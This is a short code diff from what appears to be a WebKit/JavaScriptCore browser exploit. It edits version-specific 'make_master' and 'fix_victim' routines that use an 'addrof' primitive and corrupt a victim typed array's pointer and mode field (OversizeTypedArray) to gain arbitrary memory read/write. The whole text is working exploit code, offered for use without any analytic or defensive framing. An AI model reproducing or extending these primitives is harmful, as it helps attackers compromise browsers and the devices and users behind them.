@@ -293,7 +293,7 @@ const impl_map = {
       },
       make_master(victim_addr) {
         arw.victim.setBInt(0x10, victim_addr, true);
-        arw.victim.setBInt(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
+        arw.victim.setUint32(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
       },
       fix_victim() {
         const victim_addr = arw.addrof(arw.victim);
@@ -490,6 +490,10 @@ const impl_map = {
         delete container.mode; // becomes 0
 
         return container;
+      },
+      make_master(victim_addr) {
+        arw.victim.setBInt(0x10, victim_addr, true);
+        arw.victim.setBInt(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
       },
       fix_victim() {
         const victim_addr = arw.addrof(arw.victim);
